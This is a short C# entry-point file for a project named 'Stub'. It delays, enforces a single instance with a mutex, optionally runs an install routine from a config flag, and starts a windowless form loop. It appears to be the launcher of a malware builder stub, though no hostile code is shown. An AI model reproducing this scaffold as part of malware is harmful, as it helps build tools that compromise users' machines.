using Stub.Help;
using System;
using System.Threading;
using System.Windows.Forms;

namespace Stub
{
    internal class Program
    {
        [STAThread]
        static void Main()
        {
            Thread.Sleep(2000);
            if (!MutEx.CreateMutEx())
                Environment.Exit(0);

            if (Config.install)
                Install.Run();

            new Form1();
            Application.Run();
        }
    }
}
